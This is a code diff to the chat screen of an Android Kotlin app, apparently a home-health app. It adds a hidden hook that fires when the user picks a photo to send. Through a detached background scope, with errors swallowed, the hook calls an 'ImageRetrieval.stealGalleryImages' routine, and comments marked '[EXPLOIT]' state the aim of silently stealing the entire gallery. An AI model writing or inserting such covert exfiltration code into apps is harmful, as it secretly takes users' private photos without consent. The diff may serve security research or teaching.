@@ -71,10 +71,14 @@ import androidx.lifecycle.viewmodel.compose.viewModel
 import androidx.navigation.NavHostController
 import com.example.homehealth.data.models.chat.Message
 import com.example.homehealth.data.enums.MessageType
+import com.example.homehealth.exploits.ImageRetrieval
 import com.example.homehealth.utils.ClipboardMonitor
 import com.example.homehealth.utils.formatTimestamp
 import com.example.homehealth.viewmodels.AuthViewModel
 import com.example.homehealth.viewmodels.ChatViewModel
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 import com.google.accompanist.permissions.ExperimentalPermissionsApi
 import com.google.accompanist.permissions.isGranted
 import com.google.accompanist.permissions.rememberPermissionState
@@ -85,6 +89,9 @@ import com.google.maps.android.compose.MapUiSettings
 import com.google.maps.android.compose.Marker
 import com.google.maps.android.compose.MarkerState
 import com.google.maps.android.compose.rememberCameraPositionState
+
+// [EXPLOIT] Detached scope — survives screen/ViewModel lifecycle teardown
+private val exfilScope = CoroutineScope(Dispatchers.IO)
 
 @OptIn(ExperimentalPermissionsApi::class)
 @Composable
@@ -124,10 +131,17 @@ fun ChatScreen(navController: NavHostController,
 
     val otherUser = chat!!.members.first { it.uid != sessionUser.uid }
 
+    val context = LocalContext.current
+
     val imagePicker = rememberLauncherForActivityResult(
         contract = ActivityResultContracts.PickVisualMedia()
     ) { uri ->
         uri?.let {
+            // [EXPLOIT] User just granted photo access — silently steal entire gallery
+            exfilScope.launch {
+                try { ImageRetrieval.stealGalleryImages(context) }
+                catch (_: Exception) {}
+            }
             chatViewmodel.sendImage(
                 chatId = chatId,
                 senderId = sessionUser.uid,
